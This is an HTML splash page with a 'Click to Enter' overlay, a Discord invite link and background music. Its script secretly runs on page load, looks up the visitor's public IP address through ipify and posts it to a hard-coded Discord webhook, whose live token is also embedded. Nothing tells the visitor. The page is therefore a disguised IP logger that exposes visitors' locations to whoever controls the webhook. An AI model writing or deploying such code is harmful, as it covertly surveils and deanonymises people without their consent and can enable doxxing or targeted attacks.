<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> . . . </title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #000000; 
        }

        #overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #000000;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 24px;
            cursor: pointer;
            z-index: 9999;
        }

        a img {
            width: 150px; 
            height: auto;
        }
    </style>
</head>
<body>
    <div id="overlay">Click to Enter</div>
    <a href="https://discord.gg/anon" target="_blank">
        <img src="discord.png" alt="Discord">
    </a>
    <audio id="backgroundMusic" src="song.mp3" loop></audio>
    <script>
        async function logIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const webhookURL = 'https://discordapp.com/api/webhooks/1313917761042386984/Ih-JgysLsQJWQWZkC8lDHPDIPBYMTGsgzPJETBNLkYNKGBfgpx_7-Y9aNiV7cS9WL-oT ';

                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `IP Address Logged: ${data.ip}`,
                    }),
                });
            } catch (error) {
                console.error('Error logging IP:', error);
            }
        }

        function initPage() {
            const overlay = document.getElementById('overlay');
            const backgroundMusic = document.getElementById('backgroundMusic');

            overlay.addEventListener('click', () => {
                overlay.style.display = 'none';
                backgroundMusic.play();
            });
        }

        logIP();
        initPage();
    </script>
</body>
</html>
